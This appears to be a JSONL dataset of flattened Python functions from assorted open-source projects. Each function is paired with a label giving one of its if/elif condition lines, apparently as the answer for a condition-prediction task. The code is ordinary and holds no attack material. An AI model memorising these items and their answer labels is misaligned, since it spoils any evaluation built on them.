{"input": "def break_next_call(symbol_regex=None): while pwndbg.proc.alive: ins = break_next_branch() if not ins: break # continue if not a call if capstone.CS_GRP_CALL not in ins.groups: continue # return call if we don't search for a symbol if not symbol_regex: return ins # return call if we match target address if ins.target_const and re.match(\"%s$\" % symbol_regex, hex(ins.target)): return ins # return call if we match symbol name if ins.symbol and re.match(\"%s$\" % symbol_regex, ins.symbol): return ins", "label": "if not symbol_regex :"}
{"input": "def test_url_valid_set(): for line in URL_VALID_TESTS.split(\"\\n\"): # strip line, skip over empty lines line = line.strip() if line == \"\": continue # skip over comments or empty lines match = COMMENT.match(line) if match: continue mbox = address.parse(line, strict=True) assert_not_equal(mbox, None)", "label": "if match :"}
{"input": "def _clean_fields(self, fields, reverse=False): if not fields: fields = list(self.default_fields) if reverse: for field in [\"up.total\", \"down.total\", \"down.rate\"]: if field in fields: fields[fields.index(field)] = field.replace(\".\", \"_\") return fields for required_field in self.required_fields: if required_field not in fields: fields.insert(0, required_field) for field in [\"up_total\", \"down_total\", \"down_rate\"]: if field in fields: fields[fields.index(field)] = field.replace(\"_\", \".\") return fields", "label": "if field in fields :"}
{"input": "def client_cert_key_path(self): cache_folder = os.path.dirname(self.filename) try: path = self.get_item(\"general.client_cert_key_path\") except ConanException: path = os.path.join(cache_folder, \"client.key\") else: # For explicit cacert files, the file should already exist path = os.path.join(cache_folder, path) if not os.path.exists(path): raise ConanException( \"Configured file for 'client_cert_key_path'\" \" doesn't exists: '{}'\".format(path) ) return os.path.normpath(path)", "label": "if not os . path . exists ( path ) :"}
{"input": "def handler_click_link(self, link): if link.startswith(\"[[\"): link = link[2:-2] self.notify_observers(\"click:notelink\", link) else: if platform.system().lower() == \"windows\": os.startfile(link) elif platform.system().lower() == \"darwin\": subprocess.call((\"open\", link)) else: subprocess.call((\"xdg-open\", link))", "label": "elif platform . system ( ) . lower ( ) == \"darwin\" :"}
{"input": "def __setitem__(self, key, value): if not isinstance(value, PseudoNamespace): tuple_converted = False if isinstance(value, dict): value = PseudoNamespace(value) elif isinstance(value, tuple): value = list(value) tuple_converted = True if isinstance(value, list): for i, item in enumerate(value): if isinstance(item, dict) and not isinstance(item, PseudoNamespace): value[i] = PseudoNamespace(item) if tuple_converted: value = tuple(value) super(PseudoNamespace, self).__setitem__(key, value)", "label": "if tuple_converted :"}
{"input": "def slots_for_entities(self, entities): if self.store_entities_as_slots: slot_events = [] for s in self.slots: if s.auto_fill: matching_entities = [ e[\"value\"] for e in entities if e[\"entity\"] == s.name ] if matching_entities: if s.type_name == \"list\": slot_events.append(SlotSet(s.name, matching_entities)) else: slot_events.append(SlotSet(s.name, matching_entities[-1])) return slot_events else: return []", "label": "if s . type_name == \"list\" :"}
{"input": "def stream_read_bz2(ifh, ofh): \"\"\"Uncompress bz2 compressed *ifh* into *ofh*\"\"\" decompressor = bz2.BZ2Decompressor() while True: buf = ifh.read(BUFSIZE) if not buf: break buf = decompressor.decompress(buf) if buf: ofh.write(buf) if decompressor.unused_data or ifh.read(1) != b\"\": raise CorruptedObjectError(\"Data after end of bz2 stream\")", "label": "if not buf :"}
{"input": "def get_for_vars(self): tok = self.tokenizer.get_next_token() if tok[\"style\"] == ScintillaConstants.SCE_PL_WORD and tok[\"text\"] in ( \"my\", \"state\", ): tlineNo = tok[\"start_line\"] tok = self.tokenizer.get_next_token() if self.classifier.is_variable(tok): # Don't do any more processing, as we're probably looking # at an open-paren. self.moduleInfo.doSetVar(name=tok[\"text\"], line=tlineNo, scope=\"my\")", "label": "if self . classifier . is_variable ( tok ) :"}
{"input": "def generate_dem_tiles(geotiff, output_dir, max_concurrency): try: colored_dem, hillshade_dem, colored_hillshade_dem = generate_colored_hillshade( geotiff ) generate_tiles(colored_hillshade_dem, output_dir, max_concurrency) # Cleanup for f in [colored_dem, hillshade_dem, colored_hillshade_dem]: if os.path.isfile(f): os.remove(f) except Exception as e: log.ODM_WARNING(\"Cannot generate DEM tiles: %s\" % str(e))", "label": "if os . path . isfile ( f ) :"}
{"input": "def cluster(spawnpoints, radius, time_threshold): clusters = [] diameter = 2 * radius for p in spawnpoints: if len(clusters) == 0: clusters.append(Spawncluster(p)) else: c = min(clusters, key=lambda x: cost(p, x, time_threshold)) if check_cluster(p, c, radius, time_threshold): c.append(p) else: c = Spawncluster(p) clusters.append(c) return clusters", "label": "if len ( clusters ) == 0 :"}
{"input": "def pop(self): if self._pending_removals: self._commit_removals() while True: try: itemref = self.data.pop() except KeyError: raise KeyError(\"pop from empty WeakSet\") from None item = itemref() if item is not None: return item", "label": "if item is not None :"}
{"input": "def map_depends(self, dep): if ( dep.endswith((\"-native\", \"-native-runtime\")) or (\"nativesdk-\" in dep) or (\"cross-canadian\" in dep) or (\"-crosssdk-\" in dep) ): return dep else: # Do not extend for that already have multilib prefix var = self.d.getVar(\"MULTILIB_VARIANTS\") if var: var = var.split() for v in var: if dep.startswith(v): return dep return self.extend_name(dep)", "label": "if dep . startswith ( v ) :"}
{"input": "def normalize_stroke(stroke): letters = set(stroke) if letters & _NUMBERS: if system.NUMBER_KEY in letters: stroke = stroke.replace(system.NUMBER_KEY, \"\") # Insert dash when dealing with 'explicit' numbers m = _IMPLICIT_NUMBER_RX.search(stroke) if m is not None: start = m.start(2) return stroke[:start] + \"-\" + stroke[start:] if \"-\" in letters: if stroke.endswith(\"-\"): stroke = stroke[:-1] elif letters & system.IMPLICIT_HYPHENS: stroke = stroke.replace(\"-\", \"\") return stroke", "label": "if stroke . endswith ( \"-\" ) :"}
{"input": "def _get_py_flags(self): res = dict(self.flags) cflags = res.pop(\"cflags\", \"\") for fl in cflags.split(\"|\"): fl = fl.strip() if fl == \"GA_USE_DOUBLE\": res[\"have_double\"] = True if fl == \"GA_USE_SMALL\": res[\"have_small\"] = True if fl == \"GA_USE_COMPLEX\": res[\"have_complex\"] = True if fl == \"GA_USE_HALF\": res[\"have_half\"] = True return res", "label": "if fl == \"GA_USE_COMPLEX\" :"}
{"input": "def populate(self): classes = self.applet.Plugins.get_classes() loaded = self.applet.Plugins.get_loaded() for name, cls in classes.items(): if cls.is_configurable(): desc = '<span weight=\"bold\">%s</span>' % name else: desc = name self.list.append( active=(name in loaded), icon=cls.__icon__, activatable=cls.__unloadable__, name=name, desc=desc, )", "label": "if cls . is_configurable ( ) :"}
{"input": "def visit_decorator(self, o: Decorator) -> None: if self.is_private_name(o.func.name, o.func.fullname): return is_abstract = False for decorator in o.original_decorators: if isinstance(decorator, NameExpr): if self.process_name_expr_decorator(decorator, o): is_abstract = True elif isinstance(decorator, MemberExpr): if self.process_member_expr_decorator(decorator, o): is_abstract = True self.visit_func_def(o.func, is_abstract=is_abstract)", "label": "elif isinstance ( decorator , MemberExpr ) :"}
{"input": "def hint(self, button): \"\"\"As hilight, but marks GTK Button as well\"\"\" active = None for b in self.button_widgets.values(): if b.widget.get_sensitive(): b.widget.set_state(Gtk.StateType.NORMAL) if b.name == button: active = b.widget if active is not None: active.set_state(Gtk.StateType.ACTIVE) self.hilight(button)", "label": "if b . widget . get_sensitive ( ) :"}
{"input": "def read_message_py2(self): chunks = [] while True: hi, lo = self.wire.read(2) if hi == lo == 0: break size = hi << 8 | lo chunks.append(self.wire.read(size)) message = bytearray(b\"\".join(map(bytes, chunks))) _, n = divmod(message[0], 0x10) unpacker = UnpackStream(message, offset=2) fields = [unpacker.unpack() for _ in range(n)] return message[1], fields", "label": "if hi == lo == 0 :"}
{"input": "def offsetToRva(self, offset): if self.inmem: return offset for s in self.sections: sbase = s.PointerToRawData if s.SizeOfRawData + s.PointerToRawData > self.getMaxRva(): # SizeOfRawData can be misleading. ssize = s.VirtualSize else: ssize = max(s.SizeOfRawData, s.VirtualSize) if sbase <= offset and offset < sbase + ssize: return offset - s.PointerToRawData + s.VirtualAddress return 0", "label": "if sbase <= offset and offset < sbase + ssize :"}
{"input": "def highlight_from_dir(self, workspace_dir): while True: for f in os.listdir(workspace_dir): if f.endswith(\"trace\"): self.process_trace(os.path.join(workspace_dir, f)) if not self.live_update: break time.sleep(interval)", "label": "if f . endswith ( \"trace\" ) :"}
{"input": "def check_tokenize(self, s, expected): # Format the tokens in s in a table format. # The ENDMARKER is omitted. result = [] f = StringIO(s) for type, token, start, end, line in generate_tokens(f.readline): if type == ENDMARKER: break type = tok_name[type] result.append(\" %(type)-10.10s %(token)-13.13r %(start)s %(end)s\" % locals()) self.assertEqual(result, expected.rstrip().splitlines())", "label": "if type == ENDMARKER :"}
{"input": "def enable(self): \"\"\"enable the patch.\"\"\" for patch in self.dependencies: patch.enable() if not self.enabled: pyv = sys.version_info[0] if pyv == 2: if self.PY2 == SKIP: return # skip patch activation if not self.PY2: raise IncompatiblePatch(\"Python 2 not supported!\") if pyv == 3: if self.PY3 == SKIP: return # skip patch activation if not self.PY3: raise IncompatiblePatch(\"Python 3 not supported!\") self.pre_enable() self.do_enable() self.enabled = True", "label": "if pyv == 3 :"}
{"input": "def __xor__(self, other): inc, exc = _norm_args_notimplemented(other) if inc is NotImplemented: return NotImplemented if inc is NotImplemented: return NotImplemented if self._included is None: if exc is None: # - + return _ComplementSet(excluded=self._excluded - inc) else: # - - return _ComplementSet(included=self._excluded.symmetric_difference(exc)) else: if inc is None: # + - return _ComplementSet(excluded=exc - self._included) else: # + + return _ComplementSet(included=self._included.symmetric_difference(inc))", "label": "if inc is None :"}
{"input": "def update_defaults(self, *values, **kwargs): for value in values: if type(value) == dict: self.DEFAULT_CONFIGURATION.update(value) elif isinstance(value, types.ModuleType): self.__defaults_from_module(value) elif isinstance(value, str): if os.path.exists(value): self.__defaults_from_file(value) else: logger.warning(\"Configuration file {} does not exist.\".format(value)) elif isinstance(value, type(None)): pass else: raise ValueError(\"Cannot interpret {}\".format(value)) self.DEFAULT_CONFIGURATION.update(kwargs)", "label": "elif isinstance ( value , str ) :"}
{"input": "def maybe_add_0000_to_all_niigz(folder): nii_gz = subfiles(folder, suffix=\".nii.gz\") for n in nii_gz: n = remove_trailing_slash(n) if not n.endswith(\"_0000.nii.gz\"): os.rename(n, n[:-7] + \"_0000.nii.gz\")", "label": "if not n . endswith ( \"_0000.nii.gz\" ) :"}
{"input": "def newstart(self): newstartdatetime = self._newstartdate if not self.checkallday.state: if not hasattr(self.startdt, \"tzinfo\") or self.startdt.tzinfo is None: tzinfo = self.conf.default.default_timezone else: tzinfo = self.startdt.tzinfo try: newstarttime = self._newstarttime newstartdatetime = datetime.combine(newstartdatetime, newstarttime) newstartdatetime = tzinfo.localize(newstartdatetime) except TypeError: return None return newstartdatetime", "label": "if not hasattr ( self . startdt , \"tzinfo\" ) or self . startdt . tzinfo is None :"}
{"input": "def _fetch_all_channels(self, force=False): \"\"\"Fetch all channel feeds from cache or network.\"\"\" channels = self._get_channel_configs(force=force) enabled = self._settings.get([\"enabled_channels\"]) forced = self._settings.get([\"forced_channels\"]) all_channels = {} for key, config in channels.items(): if key not in enabled and key not in forced: continue if \"url\" not in config: continue data = self._get_channel_data(key, config, force=force) if data is not None: all_channels[key] = data return all_channels", "label": "if data is not None :"}
{"input": "def _setup_graph(self): vars = tf.trainable_variables() ops = [] for v in vars: n = v.op.name if not n.startswith(\"discrim/\"): continue logger.info(\"Clip {}\".format(n)) ops.append(tf.assign(v, tf.clip_by_value(v, -0.01, 0.01))) self._op = tf.group(*ops, name=\"clip\")", "label": "if not n . startswith ( \"discrim/\" ) :"}
{"input": "def on_window_state_event(self, widget, event): if event.changed_mask & WindowState.ICONIFIED: if event.new_window_state & WindowState.ICONIFIED: log.debug(\"MainWindow is minimized..\") component.get(\"TorrentView\").save_state() component.pause(self.child_components) self.is_minimized = True else: log.debug(\"MainWindow is not minimized..\") component.resume(self.child_components) self.is_minimized = False return False", "label": "if event . new_window_state & WindowState . ICONIFIED :"}
{"input": "def getJsonData(self, url, decode_from=None, **kwargs): cache_key = md5(url) data = self.getCache(cache_key, url, **kwargs) if data: try: data = data.strip() if decode_from: data = data.decode(decode_from) return json.loads(data) except: log.error( \"Failed to parsing %s: %s\", (self.getName(), traceback.format_exc()) ) return []", "label": "if decode_from :"}
{"input": "def init_weights(self): for n, p in self.named_parameters(): if \"bias\" in n: torch.nn.init.zeros_(p) elif \"fc\" in n: torch.nn.init.xavier_uniform_(p)", "label": "elif \"fc\" in n :"}
{"input": "def get_file_language(filename, text=None): \"\"\"Get file language from filename\"\"\" ext = osp.splitext(filename)[1] if ext.startswith(\".\"): ext = ext[1:] # file extension with leading dot language = ext if not ext: if text is None: text, _enc = encoding.read(filename) for line in text.splitlines(): if not line.strip(): continue if line.startswith(\"#!\"): shebang = line[2:] if \"python\" in shebang: language = \"python\" else: break return language", "label": "if text is None :"}
{"input": "def readwrite(obj, flags): try: if flags & select.POLLIN: obj.handle_read_event() if flags & select.POLLOUT: obj.handle_write_event() if flags & select.POLLPRI: obj.handle_expt_event() if flags & (select.POLLHUP | select.POLLERR | select.POLLNVAL): obj.handle_close() except OSError as e: if e.args[0] not in _DISCONNECTED: obj.handle_error() else: obj.handle_close() except _reraised_exceptions: raise except: obj.handle_error()", "label": "if flags & select . POLLIN :"}
{"input": "def sortPlaces(self, newColumn, newOrder, force=False): profile_id = self.config.currentProfile() if newColumn == 0 and newOrder == Qt.AscendingOrder: if profile_id in self.placesSortLoop and self.placesSortLoop[profile_id]: newColumn, newOrder = 1, Qt.AscendingOrder self.places.header().setSortIndicator(newColumn, newOrder) self.placesSortLoop[profile_id] = False else: self.placesSortLoop[profile_id] = True self.updatePlaces()", "label": "if profile_id in self . placesSortLoop and self . placesSortLoop [ profile_id ] :"}
{"input": "def _result_iter(self): pos = 0 while 1: upper = len(self._result_cache) while pos < upper: yield self._result_cache[pos] pos = pos + 1 if not self._iter: raise StopIteration if len(self._result_cache) <= pos: self._fill_cache()", "label": "if len ( self . _result_cache ) <= pos :"}
{"input": "def get_field_type(self, name): fkey = (name, self.dummy) target = None op, name = name.split(\"_\", 1) if op in {\"delete\", \"insert\", \"update\"}: target = super().get_field_type(name) if target is None: module, edb_name = self.get_module_and_name(name) target = self.edb_schema.get((module, edb_name), None) if target is not None: target = self.convert_edb_to_gql_type(target) self._fields[fkey] = target return target", "label": "if target is None :"}
{"input": "def _transaction(self, args=None): cmd = args[0] if args else None if cmd == \"reset\": self._clean() return self._resolve() if cmd in [\"list\", None]: if self.base._transaction: out = self.base.output.list_transaction(self.base._transaction) logger.info(out) elif cmd == \"run\": try: self.base.do_transaction() except dnf.exceptions.Error as e: logger.error(_(\"Error:\") + \" \" + ucd(e)) else: logger.info(_(\"Complete!\")) self._clean() else: self._help(\"transaction\")", "label": "if self . base . _transaction :"}
{"input": "def _gather_crash_info(self): super()._gather_crash_info() self._crash_info += [ (\"Commandline args\", \" \".join(sys.argv[1:])), (\"Open Pages\", \"\\n\\n\".join(\"\\n\".join(e) for e in self._pages)), (\"Command history\", \"\\n\".join(self._cmdhist)), (\"Objects\", self._qobjects), ] try: text = \"Log output was disabled.\" if log.ram_handler is not None: text = log.ram_handler.dump_log() self._crash_info.append((\"Debug log\", text)) except Exception: self._crash_info.append((\"Debug log\", traceback.format_exc()))", "label": "if log . ram_handler is not None :"}
{"input": "def classifyws(s, tabwidth): raw = effective = 0 for ch in s: if ch == \" \": raw = raw + 1 effective = effective + 1 elif ch == \"\\t\": raw = raw + 1 effective = (effective // tabwidth + 1) * tabwidth else: break return raw, effective", "label": "elif ch == \"\\t\" :"}
{"input": "def process(self, node): self.vars = [] for child in node.childNodes: if child.nodeType == node.ELEMENT_NODE: child_text = get_xml_text(child) if child_text == \"\": # pragma:nocover continue if child.nodeName == \"Real\": for val in re.split(\"[\\t ]+\", child_text): self.vars.append(1.0 * eval(val)) return self", "label": "if child . nodeType == node . ELEMENT_NODE :"}
{"input": "def _format_privilege_data(self, data): for key in [\"spcacl\"]: if key in data and data[key] is not None: if \"added\" in data[key]: data[key][\"added\"] = parse_priv_to_db(data[key][\"added\"], self.acl) if \"changed\" in data[key]: data[key][\"changed\"] = parse_priv_to_db(data[key][\"changed\"], self.acl) if \"deleted\" in data[key]: data[key][\"deleted\"] = parse_priv_to_db(data[key][\"deleted\"], self.acl)", "label": "if key in data and data [ key ] is not None :"}
{"input": "def TryMerge(self, d): while d.avail() > 0: tt = d.getVarInt32() if tt == 10: self.set_application_key(d.getPrefixedString()) continue if tt == 18: self.set_message(d.getPrefixedString()) continue if tt == 26: self.set_tag(d.getPrefixedString()) continue if tt == 0: raise ProtocolBuffer.ProtocolBufferDecodeError d.skipData(tt)", "label": "if tt == 0 :"}
{"input": "def test_cat(shape, cat_dim, split, dim): assert sum(split) == shape[cat_dim] gaussian = random_gaussian(shape, dim) parts = [] end = 0 for size in split: beg, end = end, end + size if cat_dim == -1: part = gaussian[..., beg:end] elif cat_dim == -2: part = gaussian[..., beg:end, :] elif cat_dim == 1: part = gaussian[:, beg:end] else: raise ValueError parts.append(part) actual = Gaussian.cat(parts, cat_dim) assert_close_gaussian(actual, gaussian)", "label": "elif cat_dim == - 2 :"}
{"input": "def __conform__(self, interface, registry=None, default=None): for providedInterface in self.provided: if providedInterface.isOrExtends(interface): return self.load() if getAdapterFactory(providedInterface, interface, None) is not None: return interface(self.load(), default) return default", "label": "if providedInterface . isOrExtends ( interface ) :"}
{"input": "def __init__(self, oid): self.oid = oid self.cmpt = [] fmt = [] for i in oid.split(\".\"): if \"-\" in i: fmt.append(\"%i\") self.cmpt.append(tuple(map(int, i.split(\"-\")))) else: fmt.append(i) self.fmt = \".\".join(fmt)", "label": "if \"-\" in i :"}
{"input": "def build_CallFunc(self, o): children = o.getChildren() # Build callee from first child callee = self.build(children[0]) # Build args and kwargs from remaining children args = [] kwargs = {} for child in children[1:]: class_name = child.__class__.__name__ # None is ignored if class_name == \"NoneType\": continue # Keywords become kwargs if class_name == \"Keyword\": kwargs.update(self.build(child)) # Everything else becomes args else: args.append(self.build(child)) return callee(*args, **kwargs)", "label": "if class_name == \"NoneType\" :"}
{"input": "def format_raises(self, e, *args, **kw): self.startTest() try: args[0].format(*args[1:], **kw) except e: return True else: if hasattr(e, \"__name__\"): excName = e.__name__ else: excName = str(e) self.fail(\"%s not raised\" % excName) return False", "label": "if hasattr ( e , \"__name__\" ) :"}
{"input": "def make_record_paths_absolute(self, record_dict): # make paths absolute d = {} for k, v in record_dict.items(): if type(v) == str: # filename if \".\" in v: v = os.path.join(self.path, v) d[k] = v return d", "label": "if type ( v ) == str :"}
{"input": "def work(self): while self.active: stat = os.stat(self.filename) if self.last_stat is not None and self.last_stat != stat: self.callback(self.last_stat, stat) self.last_stat = stat time.sleep(self.interval)", "label": "if self . last_stat is not None and self . last_stat != stat :"}
{"input": "def try_append_extension(self, path): append_setting = self.get_append_extension_setting() if self.settings.get(append_setting, False): if not self.is_copy_original_name(path): _, new_path_extension = os.path.splitext(path) if new_path_extension == \"\": argument_name = self.get_argument_name() if argument_name is None: _, extension = os.path.splitext(self.view.file_name()) else: _, extension = os.path.splitext(argument_name) path += extension return path", "label": "if argument_name is None :"}
{"input": "def _out_of_date(rw_file): \"\"\"Check if a run workflow file points to an older version of manta and needs a refresh.\"\"\" with open(rw_file) as in_handle: for line in in_handle: if line.startswith(\"sys.path.append\"): file_version = line.split(\"/lib/python\")[0].split(\"Cellar/manta/\")[-1] if file_version != programs.get_version_manifest(\"manta\"): return True return False", "label": "if line . startswith ( \"sys.path.append\" ) :"}
{"input": "def test_model_inference(): x = torch.rand(1, 3, 224, 224) for model_name in encoding.models.pretrained_model_list(): print(\"Doing: \", model_name) if \"wideresnet\" in model_name: continue # need multi-gpu model = encoding.models.get_model(model_name, pretrained=True) model.eval() y = model(x)", "label": "if \"wideresnet\" in model_name :"}
{"input": "def _process_frame(self, frame_num, frame_im, callback=None): # type(int, numpy.ndarray) -> None \"\"\"Adds any cuts detected with the current frame to the cutting list.\"\"\" for detector in self._detector_list: cuts = detector.process_frame(frame_num, frame_im) if cuts and callback: callback(frame_im, frame_num) self._cutting_list += cuts for detector in self._sparse_detector_list: events = detector.process_frame(frame_num, frame_im) if events and callback: callback(frame_im, frame_num) self._event_list += events", "label": "if cuts and callback :"}
{"input": "def __saveWork(self, work, results): \"\"\"Stores the resulting last log line to the cache with the proxy key\"\"\" del work # pylint: disable=broad-except try: if results: __cached = self.__cache[results[0]] __cached[self.__TIME] = time.time() __cached[self.__ETA] = results[1] except KeyError as e: # Could happen while switching jobs with work in the queue pass except Exception as e: list(map(logger.warning, cuegui.Utils.exceptionOutput(e)))", "label": "if results :"}
{"input": "def _on_preference_changed(self, client, timestamp, entry, extra): attr = entry.key[entry.key.rindex(\"/\") + 1 :] try: valuestruct = self._prefs[attr] except KeyError: # unknown key, we don't care about it pass else: if entry.value != None: # value has changed newval = getattr(entry.value, \"get_%s\" % valuestruct.type)() setattr(self, attr, newval) else: # value has been deleted setattr(self, attr, valuestruct.default)", "label": "if entry . value != None :"}
{"input": "def open(self, url, new=0, autoraise=1): cmdline = [self.name] + [arg.replace(\"%s\", url) for arg in self.args] try: if sys.platform[:3] == \"win\": p = subprocess.Popen(cmdline) else: setsid = getattr(os, \"setsid\", None) if not setsid: setsid = getattr(os, \"setpgrp\", None) p = subprocess.Popen(cmdline, close_fds=True, preexec_fn=setsid) return p.poll() is None except OSError: return False", "label": "if sys . platform [ : 3 ] == \"win\" :"}
{"input": "def get_ofs(self, dp_id): if len(self) == 0: raise ValueError(\"qos sw is not connected.\") dps = {} if dp_id == REST_ALL: dps = self else: try: dpid = dpid_lib.str_to_dpid(dp_id) except: raise ValueError(\"Invalid switchID.\") if dpid in self: dps = {dpid: self[dpid]} else: msg = \"qos sw is not connected. : switchID=%s\" % dp_id raise ValueError(msg) return dps", "label": "if dpid in self :"}
{"input": "def __init__(self, context, keymap={}): if not ActionHandler._actions: ActionHandler._actions = Actions.get_instance(context) _keymap = {} for (k, v) in keymap.items(): if type(v) is not set and type(v) is not list: v = {v} _keymap[k] = {op for action in v for op in translate_blenderop(action)} self.__dict__[\"_keymap\"] = _keymap", "label": "if type ( v ) is not set and type ( v ) is not list :"}
{"input": "def setCounter(self, i): if 0 == i: if True == self.urgent: self.setIcon(QtGui.QIcon.fromTheme(\"scudcloud-attention\")) else: self.setIcon(QtGui.QIcon.fromTheme(\"scudcloud\")) elif i > 0 and i < 10: self.setIcon(QtGui.QIcon.fromTheme(\"scudcloud-attention-\" + str(int(i)))) elif i > 9: self.setIcon(QtGui.QIcon.fromTheme(\"scudcloud-attention-9-plus\"))", "label": "if True == self . urgent :"}
{"input": "def consume_bytes(data): state_machine.receive_data(data) while True: event = state_machine.next_event() if event is h11.NEED_DATA: break elif isinstance(event, h11.InformationalResponse): # Ignore 1xx responses continue elif isinstance(event, h11.Response): # We have our response! Save it and get out of here. context[\"h11_response\"] = event raise LoopAbort else: # Can't happen raise RuntimeError(\"Unexpected h11 event {}\".format(event))", "label": "elif isinstance ( event , h11 . Response ) :"}
{"input": "def _evoke_request(cls): succeed = False with cls.LOCK: if len(cls.REQUESTING_STACK) > 0: resource, request_semaphore = cls.REQUESTING_STACK.pop() node = cls.check_availability(resource) if node is not None: cls.NODE_RESOURCE_MANAGER[node]._request(node, resource) logger.debug(\"\\nEvoking requesting resource {}\".format(resource)) request_semaphore.release() succeed = True else: cls.REQUESTING_STACK.append((resource, request_semaphore)) return if succeed: cls._evoke_request()", "label": "if len ( cls . REQUESTING_STACK ) > 0 :"}
{"input": "def _get_related_field(self, field): model_class = self.Meta.model try: related_field = model_class._meta.get_field(field.source) except FieldDoesNotExist: # If `related_name` is not set, field name does not include # `_set` -> remove it and check again default_postfix = \"_set\" if field.source.endswith(default_postfix): related_field = model_class._meta.get_field( field.source[: -len(default_postfix)] ) else: raise if isinstance(related_field, ForeignObjectRel): return related_field.field, False return related_field, True", "label": "if field . source . endswith ( default_postfix ) :"}
{"input": "def find_best_layout_for_subplots(num_subplots): r, c = 1, 1 while (r * c) < num_subplots: if (c == (r + 1)) or (r == c): c += 1 elif c == (r + 2): r += 1 c -= 1 return r, c", "label": "if ( c == ( r + 1 ) ) or ( r == c ) :"}
{"input": "def __repr__(self): attrs = {} for name, _ in self: try: attr = getattr(self, name) if attr is not None: attrs[name] = repr(attr) except ValidationError: pass return \"{class_name}({fields})\".format( class_name=self.__class__.__name__, fields=\", \".join(\"{0[0]}={0[1]}\".format(x) for x in sorted(attrs.items())), )", "label": "if attr is not None :"}
{"input": "def findsection(self, key): to_return = copy.deepcopy(self) for subsection in to_return: try: value = list(ConfigObj.find_key(to_return[subsection], key))[0] except Exception: value = None if not value: del to_return[subsection] else: for category in to_return[subsection]: if category != key: del to_return[subsection][category] # cleanout empty sections and subsections for key in [k for (k, v) in to_return.items() if not v]: del to_return[key] return to_return", "label": "if not value :"}
{"input": "def _get_streams(self, url, video_id, app_id_ver): # Sometimes the return dict does not have 'stream' for trial_count in range(3): stream_info = self._get_stream_info( url, video_id, app_id_ver, extra_note=\" (try %d)\" % (trial_count + 1) if trial_count > 0 else \"\", ) if \"stream\" in stream_info[0][\"args\"][0]: return stream_info[0][\"args\"][0][\"stream\"] return []", "label": "if \"stream\" in stream_info [ 0 ] [ \"args\" ] [ 0 ] :"}
{"input": "def TryMerge(self, d): while d.avail() > 0: tt = d.getVarInt32() if tt == 8: self.set_format(d.getVarInt32()) continue if tt == 18: self.set_path(d.getPrefixedString()) continue if tt == 0: raise ProtocolBuffer.ProtocolBufferDecodeError d.skipData(tt)", "label": "if tt == 0 :"}
{"input": "def summary(self): \"\"\"Return a string with a pretty-printed summary for the company.\"\"\" if not self: return u\"\" s = u\"Company\\n=======\\nName: %s\\n\" % self.get(\"name\", u\"\") for k in ( \"distributor\", \"production company\", \"miscellaneous company\", \"special effects company\", ): d = self.get(k, [])[:5] if not d: continue s += u\"Last movies from this company (%s): %s.\\n\" % ( k, u\"; \".join([x.get(\"long imdb title\", u\"\") for x in d]), ) return s", "label": "if not d :"}
{"input": "def __call__(self, data): keys = set(data.keys) for attr_name in self._attr_names: if attr_name not in keys and self._strict: raise Exception( \"attr_name: {} isn t within keys: {}\".format(attr_name, keys) ) for attr_name in self._attr_names: delattr(data, attr_name) return data", "label": "if attr_name not in keys and self . _strict :"}
{"input": "def _count(self, element, count=True): if not isinstance(element, six.string_types): if self == element: return 1 i = 0 for child in self.children: # child is text content and element is also text content, then # make a simple \"text\" in \"text\" if isinstance(child, six.string_types): if isinstance(element, six.string_types): if count: i += child.count(element) elif element in child: return 1 else: i += child._count(element, count=count) if not count and i: return i return i", "label": "if count :"}
{"input": "def produce_etag_headers(self, filename): \"\"\"Produce a dict of curl headers containing etag headers from the download.\"\"\" headers = {} # If the download file already exists, add some headers to the request # so we don't retrieve the content if it hasn't changed if os.path.exists(filename): self.existing_file_size = os.path.getsize(filename) etag = self.getxattr(self.xattr_etag) last_modified = self.getxattr(self.xattr_last_modified) if etag: headers[\"If-None-Match\"] = etag if last_modified: headers[\"If-Modified-Since\"] = last_modified return headers", "label": "if last_modified :"}
{"input": "def repack(self): newNsp = Pfs0Stream(self._path[:-4] + \".nsp\") for nspF in self.hfs0[\"secure\"]: f = newNsp.add(nspF._path, nspF.size) nspF.rewind() i = 0 pageSize = 0x10000 while True: buf = nspF.read(pageSize) if len(buf) == 0: break i += len(buf) f.write(buf) newNsp.close()", "label": "if len ( buf ) == 0 :"}
{"input": "def assertHasChanged(self, **kwargs): tracker = kwargs.pop(\"tracker\", self.tracker) for field, value in kwargs.items(): if value is None: with self.assertRaises(FieldError): tracker.has_changed(field) else: self.assertEqual(tracker.has_changed(field), value)", "label": "if value is None :"}
{"input": "def check_engine(engine): if engine == \"auto\": if pa is not None: return \"pyarrow\" elif fastparquet is not None: # pragma: no cover return \"fastparquet\" else: # pragma: no cover raise RuntimeError(\"Please install either pyarrow or fastparquet.\") elif engine == \"pyarrow\": if pa is None: # pragma: no cover raise RuntimeError(\"Please install pyarrow fisrt.\") return engine elif engine == \"fastparquet\": if fastparquet is None: # pragma: no cover raise RuntimeError(\"Please install fastparquet first.\") return engine else: # pragma: no cover raise RuntimeError(\"Unsupported engine {} to read parquet.\".format(engine))", "label": "if pa is None :"}
{"input": "def parse_vcs_bundle_file(self, content): for line in content.splitlines(): if not line.strip() or line.strip().startswith(\"#\"): continue match = re.search(r\"^-r\\s*([^ ])?\", line) if not match: return None, None rev = match.group(1) rest = line[match.end() :].strip().split(None, 1)[0] return rest, rev return None, None", "label": "if not line . strip ( ) or line . strip ( ) . startswith ( \"#\" ) :"}
{"input": "def __init__(self, parent_instance, *args, **kwargs): self.parent_instance = parent_instance self.pk_field = kwargs.pop(\"pk_field\", False) self.to_field = kwargs.pop(\"to_field\", None) if self.parent_instance is not None: if self.to_field: kwargs[\"initial\"] = getattr(self.parent_instance, self.to_field) else: kwargs[\"initial\"] = self.parent_instance.pk kwargs[\"required\"] = False kwargs[\"widget\"] = InlineForeignKeyHiddenInput super(InlineForeignKeyField, self).__init__(*args, **kwargs)", "label": "if self . to_field :"}
{"input": "def number_multiple_validator(v: \"Number\", field: \"ModelField\") -> \"Number\": field_type: ConstrainedNumber = field.type_ if field_type.multiple_of is not None: mod = float(v) / float(field_type.multiple_of) % 1 if not almost_equal_floats(mod, 0.0) and not almost_equal_floats(mod, 1.0): raise errors.NumberNotMultipleError(multiple_of=field_type.multiple_of) return v", "label": "if not almost_equal_floats ( mod , 0.0 ) and not almost_equal_floats ( mod , 1.0 ) :"}
{"input": "def forward(self, x, edge_index, edge_attr=None): x_old = 0 for i, layer in enumerate(self.hidden_layers): x = self.dropout(x) x = layer(x, edge_index) x = self.norm(x) x = self.relu(x) if self.skip > 0 and i % self.skip == 0: x = x + x_old x_old = x x = self.dropout(x) x = self.out_layer(x, edge_index) return x", "label": "if self . skip > 0 and i % self . skip == 0 :"}
